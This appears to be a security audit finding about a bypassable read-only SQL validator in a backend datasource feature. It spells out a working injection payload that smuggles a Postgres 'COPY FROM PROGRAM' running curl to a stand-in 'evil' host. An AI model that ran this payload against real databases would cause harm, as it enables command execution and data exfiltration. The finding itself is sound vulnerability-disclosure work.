panel.finding_key: packages/backend/src/datasource/sql-validator.ts::read-only sql guard bypassable: validator strips "comments" the executed query does not have, allowing arbitrary multi-statement sql on the datasource feature this change newly documents/advertises
panel.summary: Read-only SQL guard bypassable: validator strips "comments" the executed query does not have, allowing arbitrary multi-statement SQL on the datasource feature this change newly documents/advertises
panel.evidence: `validateSelectQuery` strips `/*...*/` with a regex BEFORE any string-literal awareness (sql-validator.ts:28-31), but `executeQuery` runs the ORIGINAL, unstripped `dto.query` (datasource.service.ts:150). A `/*` inside a string literal therefore blanks out the middle of the query for the validator while Postgres executes it. Payload (any workspace member — the only gate is `assertMember`, datasource.controller.ts:139-143): `SELECT '/*' AS a) AS q; COPY t FROM PROGRAM 'curl http://evil/$(id)'; SELECT * FROM (SELECT '*/' AS b`. Validator view after comment-strip is `SELECT '' AS b` → first token SELECT, no forbidden keyword, no semicolon → valid. Executed string becomes `SELECT * FROM (SELECT '/*' AS a) AS q; COPY t FROM PROGRAM '...'; SELECT * FROM (SELECT '*/' AS b) AS _q LIMIT 10001` — three syntactically valid statements, giving INSERT/UPDATE/DELETE/DROP/COPY-FROM-PROGRAM against the connection owner's credentials. Pre-existing code; this change adds packages/documentation/sheets/datasources.md and a homepage card promoting the feature as SELECT-only/read-only.
